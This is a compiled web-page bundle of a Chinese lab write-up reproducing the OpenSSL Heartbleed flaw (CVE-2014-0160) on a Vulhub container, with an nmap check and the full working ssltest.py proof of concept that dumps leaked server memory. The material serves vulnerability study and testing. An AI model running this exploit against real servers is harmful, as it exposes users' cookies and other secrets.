import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as c,c as i,a as n,b as s,d as p,e}from"./app-58e4a7d6.js";const l={},u=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),r=n("p",null,"在OpenSSL1.0.1版本中存在严重漏洞（CVE-2014-0160），此次漏洞问题存在于ssl/dl_both.c文件中。OpenSSL Heartbleed模块存在一个BUG，当攻击者构造一个特殊的数据包，满足用户心跳包中无法提供足够多的数据，会导致memcpy把SSLv3记录之后的数据直接输出，该漏洞导致攻击者可以远程读取存在漏洞版本的openssl服务器内存中长大64K的数据。",-1),k=n("p",null,"心脏出血是一个内存漏洞，攻击者利用这个漏洞可以服务到目标进程内存信息，如其他人的Cookie等敏感信息。",-1),d=n("p",null,"参考链接：",-1),v={href:"https://heartbleed.com/",target:"_blank",rel:"noopener noreferrer"},b={href:"https://filippo.io/Heartbleed",target:"_blank",rel:"noopener noreferrer"},m=e(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub运行如下命令启动一个使用了OpenSSL 1.0.1c的Nginx服务器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，访问<code>https://your-ip</code>即可查看到hello页面。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202240952891.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>通过Nmap进行漏洞检测：</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>nmap <span class="token parameter variable">-sV</span> <span class="token parameter variable">-p</span> <span class="token number">443</span> <span class="token parameter variable">--script</span> ssl-heartbleed.nse your-ip
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202241023370.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,9),y={href:"https://github.com/vulhub/vulhub/blob/master/openssl/heartbleed/ssltest.py",target:"_blank",rel:"noopener noreferrer"},h=n("figure",null,[n("img",{src:"https://cb86160.webp.li/makabaka-r1-photo/202202241040993.png",alt:"",tabindex:"0",loading:"lazy"}),n("figcaption")],-1),g=n("h2",{id:"漏洞poc",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞poc","aria-hidden":"true"},"#"),s(" 漏洞POC")],-1),f={href:"http://ssltest.py",target:"_blank",rel:"noopener noreferrer"},w=e(`<div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/python</span>

<span class="token comment"># Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)</span>
<span class="token comment"># The author disclaims copyright to this source code.</span>

<span class="token keyword">import</span> sys
<span class="token keyword">import</span> struct
<span class="token keyword">import</span> socket
<span class="token keyword">import</span> time
<span class="token keyword">import</span> select
<span class="token keyword">import</span> binascii
<span class="token keyword">import</span> re
<span class="token keyword">from</span> optparse <span class="token keyword">import</span> OptionParser

options <span class="token operator">=</span> OptionParser<span class="token punctuation">(</span>usage<span class="token operator">=</span><span class="token string">&#39;%prog server [options]&#39;</span><span class="token punctuation">,</span> description<span class="token operator">=</span><span class="token string">&#39;Test for SSL heartbeat vulnerability (CVE-2014-0160)&#39;</span><span class="token punctuation">)</span>
options<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">&#39;-p&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;--port&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token string">&#39;int&#39;</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">443</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;TCP port to test (default: 443)&#39;</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">h2bin</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span>x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&#39; &#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&#39;\\n&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

hello <span class="token operator">=</span> h2bin<span class="token punctuation">(</span><span class="token triple-quoted-string string">&#39;&#39;&#39;
16 03 02 00 dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01
&#39;&#39;&#39;</span><span class="token punctuation">)</span>

hb <span class="token operator">=</span> h2bin<span class="token punctuation">(</span><span class="token triple-quoted-string string">&#39;&#39;&#39;
18 03 02 00 03
01 40 00
&#39;&#39;&#39;</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">hexdump</span><span class="token punctuation">(</span>s<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> b <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        lin <span class="token operator">=</span> <span class="token punctuation">[</span>c <span class="token keyword">for</span> c <span class="token keyword">in</span> s<span class="token punctuation">[</span>b <span class="token punctuation">:</span> b <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
        hxdat <span class="token operator">=</span> <span class="token string">&#39; &#39;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">&#39;%02X&#39;</span> <span class="token operator">%</span> c <span class="token keyword">for</span> c <span class="token keyword">in</span> lin<span class="token punctuation">)</span>
        pdat <span class="token operator">=</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token number">32</span> <span class="token operator">&lt;=</span> c <span class="token operator">&lt;=</span> <span class="token number">126</span> <span class="token keyword">else</span> <span class="token string">&#39;.&#39;</span> <span class="token punctuation">)</span><span class="token keyword">for</span> c <span class="token keyword">in</span> lin<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;  %04x: %-48s %s&#39;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>b<span class="token punctuation">,</span> hxdat<span class="token punctuation">,</span> pdat<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;&quot;</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">recvall</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> length<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    endtime <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> timeout
    rdata <span class="token operator">=</span> <span class="token string">b&#39;&#39;</span>
    remain <span class="token operator">=</span> length
    <span class="token keyword">while</span> remain <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
        rtime <span class="token operator">=</span> endtime <span class="token operator">-</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> rtime <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">None</span>
        r<span class="token punctuation">,</span> w<span class="token punctuation">,</span> e <span class="token operator">=</span> select<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token punctuation">[</span>s<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> s <span class="token keyword">in</span> r<span class="token punctuation">:</span>
            data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>remain<span class="token punctuation">)</span>
            <span class="token comment"># EOF?</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> data<span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token boolean">None</span>
            rdata <span class="token operator">+=</span> data
            remain <span class="token operator">-=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    <span class="token keyword">return</span> rdata


<span class="token keyword">def</span> <span class="token function">recvmsg</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    hdr <span class="token operator">=</span> recvall<span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> hdr <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;Unexpected EOF receiving record header - server closed connection&#39;</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span>
    typ<span class="token punctuation">,</span> ver<span class="token punctuation">,</span> ln <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">&#39;&gt;BHH&#39;</span><span class="token punctuation">,</span> hdr<span class="token punctuation">)</span>
    pay <span class="token operator">=</span> recvall<span class="token punctuation">(</span>s<span class="token punctuation">,</span> ln<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> pay <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;Unexpected EOF receiving record payload - server closed connection&#39;</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39; ... received message: type = %d, ver = %04x, length = %d&#39;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>typ<span class="token punctuation">,</span> ver<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> typ<span class="token punctuation">,</span> ver<span class="token punctuation">,</span> pay

<span class="token keyword">def</span> <span class="token function">hit_hb</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>hb<span class="token punctuation">)</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        typ<span class="token punctuation">,</span> ver<span class="token punctuation">,</span> pay <span class="token operator">=</span> recvmsg<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
        <span class="token keyword">if</span> typ <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;No heartbeat response received, server likely not vulnerable&#39;</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>

        <span class="token keyword">if</span> typ <span class="token operator">==</span> <span class="token number">24</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;Received heartbeat response:&#39;</span><span class="token punctuation">)</span>
            hexdump<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pay<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">3</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;WARNING: server returned more data than it should - server is vulnerable!&#39;</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;Server processed malformed heartbeat, but did not return any extra data.&#39;</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token boolean">True</span>

        <span class="token keyword">if</span> typ <span class="token operator">==</span> <span class="token number">21</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;Received alert:&#39;</span><span class="token punctuation">)</span>
            hexdump<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;Server returned error, likely not vulnerable&#39;</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    opts<span class="token punctuation">,</span> args <span class="token operator">=</span> options<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">:</span>
        options<span class="token punctuation">.</span>print_help<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span>

    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;Connecting...&#39;</span><span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> opts<span class="token punctuation">.</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;Sending Client Hello...&#39;</span><span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>hello<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;Waiting for Server Hello...&#39;</span><span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        typ<span class="token punctuation">,</span> ver<span class="token punctuation">,</span> pay <span class="token operator">=</span> recvmsg<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
        <span class="token keyword">if</span> typ <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;Server closed connection without sending Server Hello.&#39;</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span>
        <span class="token comment"># Look for server hello done message.</span>
        <span class="token keyword">if</span> typ <span class="token operator">==</span> <span class="token number">22</span> <span class="token keyword">and</span> pay<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x0E</span><span class="token punctuation">:</span>
            <span class="token keyword">break</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;Sending heartbeat request...&#39;</span><span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>hb<span class="token punctuation">)</span>
    hit_hb<span class="token punctuation">(</span>s<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,1);function _(x,S){const a=o("ExternalLinkIcon");return c(),i("div",null,[u,r,k,d,n("ul",null,[n("li",null,[n("a",v,[s("https://heartbleed.com/"),p(a)])]),n("li",null,[n("a",b,[s("https://filippo.io/Heartbleed"),p(a)])])]),m,n("p",null,[s("Python运行"),n("a",y,[s("ssltest.py"),p(a)]),s("，拿到敏感数据（可能包含Cookie）。")]),h,g,n("p",null,[n("a",f,[s("ssltest.py"),p(a)]),s("：")]),w])}const C=t(l,[["render",_],["__file","OpenSSL 心脏出血漏洞 CVE-2014-0160.html.vue"]]);export{C as default};
